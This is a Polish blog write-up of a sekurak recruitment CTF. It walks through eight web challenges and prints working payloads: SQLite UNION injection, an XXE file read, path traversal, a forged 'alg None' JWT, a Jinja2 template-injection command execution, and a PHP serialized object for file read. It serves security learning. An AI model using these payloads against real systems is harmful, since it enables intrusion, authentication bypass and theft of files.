---
title: Zbiorczy CTF - rekrutacja BGK by sekurak
author: k1k9
categories: [web]
tags: [ctf]
---
CTF był pod adresem: http://139.177.183.71/bgk-ctf-31337/

## 1 - Xcross this
Po wejściu na stronę widzimy, że aplikacja pobiera od użytkownika dane, które potem wyświetla przy użyciu biblioteki MathJax ver. 2.7.0.
![alt text](/assets/posts/ctf_bgk/xcross_this1.png)

Dodatkowo jeżeli zajrzymy w kod strony zobaczymy niewidoczny link LogOut oraz skrypt w JS, który w zasadzie nic ciekawego nie robi.

Po kilku próbach exploitacji parametru XSS, przeszedłem do testowania tego tajemniczego linku:
```html
<a href="?LogOut=1" id="LogOut"></a>
```
I po przejściu na link otrzymujemy odpowiedź:
```json
{"error":"VVRGU1IxZ3pkRlJrU0VsM1ltMWtTbUpyTVdoa1IyZzJWMWM1TVZGWVNteG1VVzg5Q2c9PQo=\n"}
```
Na pierwszy rzut oka wygląda to jak base64 więc staram się to odszyfrować, okazuje się że flaga jest potrójnie zaszyfrowana basem ;)
```bash
echo "VVRGU1IxZ3pkRlJrU0VsM1ltMWtTbUpyTVdoa1IyZzJWMWM1TVZGWVNteG1VVzg5Q2c9PQo=" | base64 -d | base64 -d | base64 -d
```

## 2 - Cross site
Zadanie zostało prawdopodobnie wyłączone (nie udało mi się tam dostać), kod prowadzący do zadania 2:
```html
<!--<li>
    <input type="checkbox" id="task2" class="task-toggle">
    <label for="task2" class="task-title">2 - Cross-site</label>
    <div class="task-description">
        <p><a href="http://139.177.183.71:2000/"
                target-"_blank">Link do zadania</a></p>
    </div>
</li>-->
```

## 3 - Database
Po analizie kodu strony można zauważyć, że interesującym parametrem wydaje się być prametr ```?query=```.

Spróbowałem podać kilka typowych znaków, które mogą wywołąć błąd zapytania i okazuje się, że baza danych jest podatna po podaniu znaku ```'```, otrzymujemy wówczas komunikat: ```SQLITE_ERROR```. A więc przejdźmy do szperania w bazie.

### Sprawdzenie ilości kolumn
Po kilku minutach testowania widzę, że baza jest podatna na SQLi za pomocą ```UNION```. Więc przejdę do sprawdzenia co zawiera tabela z ofertami. W tym celu użyję polecenia:
```sql
test') UNION SELECT NULL,NULL,NULL,NULL--
```
Oczywiście NULL, zwiększamy dopóki strona nie przestanie zwracać błędu, ilość NULLi informuje nas o liczbie kolumn w tabeli.

### Ustalenie nazwy tabeli i kolumn
```sql
test') UNION SELECT (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL),NULL,NULL,NULL--
```
otrzymujemy odpowiedź:
```sql
CREATE TABLE offers ( title TEXT, text TEXT, image TEXT, hidden BOOL )
```

### Wyciągnięcie flagi
No to pozostało nam pobranie wszystkich ofert i znalezienie tej jednej ukrytej:
```sql
XD') UNION SELECT title,text,image,hidden FROM offers--
```

## 4 - External Entity
Widzimy, że flaga ukryta jest w pliku ```/tmp/flag``` i musimy użyć do tego XML. Jak sama nazwa zresztą nam sugeruje strona jest podatna na XEE (XML External Entity).
![alt text](/assets/posts/ctf_bgk/external_entity.png)

Zatem spróbujemy dostać się do pliku z flagą wykorzystując XEE:
```xml
<!DOCTYPE k1k9[<!ENTITY example SYSTEM "/tmp/flag"> ]>
<creds>
    <user>&example;</user>
    <pass>admin</pass>
</creds>
```

## 5 - deardir
Po wejściu na strone dostajemy informacje o podaniu ścieżki w parametrze file, a jak zajrzymy w kod strony to widzimy, że flaga znowu jest ukryta w pliku ```/tmp/flag```. Jest to tradycyjny path traversal (```?file=../../../tmp/flag```).

## 6 - I'm brOken'
Widzimy panel logowania a w nim mamy podane dane logowania. Po zalogowaniu się strona ustawia nam ciasteczko session, podobne do tego:
![alt text](/assets/posts/ctf_bgk/im_broken.png)

Jest to ciekawe bo biorąc pod uwagę, że mam dane logowania i ustawiane jest ciasteczko JWT sugeruje to, że tutaj trzeba szukać jakiejś dziury. 

Poszperałem w internecie i znalazłem podatność CVE-2015-9235, która w zasadzie mówi nam, że wystarczy zmienić algorytm na None i usunąć część z sygnaturą.

Tak więc tworze nowe ciasteczko:
```bash
echo -n '{"alg":"None","typ":"JWT"}' | base64 | tr -d '='
echo -n '{"username":"admin","iat":1712129895}' | base64 | tr -d '=' 
```
Obie części łączę kropką i na końcu dodaje kropkę (dalej nic nie podaje bo pomijam sygnaturę). Efekt:
```bash
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzEyMTI5ODk1fQ.
```
Podmieniam ciasteczko na stronie i... nic. 
Okazuje się, że flaga jest ukryta w kodzie aplikacji, gdy wywołamy podatność to strona wygeneruje nam w HTML import pliku app.js i tutaj znajdziemy flagę.

## 7 - Welcome, I, you
Strona mówi nam aby podać swoje imię jako część URI: ```/greeting/<imie>```.
Z nagłówków HTTP wiem, że strona stoi na:
```HTTP
Server: Werkzeug/3.0.1 Python/3.8.18
```
Tak więc spróbujmy coś tutaj wstrzyknąć. XSSa tutaj nie ma ale mamy SSTI (Server Side Template Injection). Czyli wykorzystując Pythona i template engine Jinja2. Szybka weryfikacja ```/greeting/{{config.items()}}``` i działa, tak więc spróbujmy zrobić jakieś RCE:  ```{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}``` i mamy:

![alt text](/assets/posts/ctf_bgk/welcome_i_you.png)

Jak zrobimy ```ls -la``` to widzimy plik ```flag.txt```, który okazuje się być tym czego szukamy.

## 8 - Why s0 deserious?
No to tutaj spraw jest dużo prostsza wystarczy, że stworzymy sobie obiekt i wywołamy na nim funkcję serialize:
```php
<?php
class FileRead {
    public $file = '../flag.txt';
}

$object = new FileRead();
echo serialize($object);
?>
```
I przekażemy to jako parametr GET.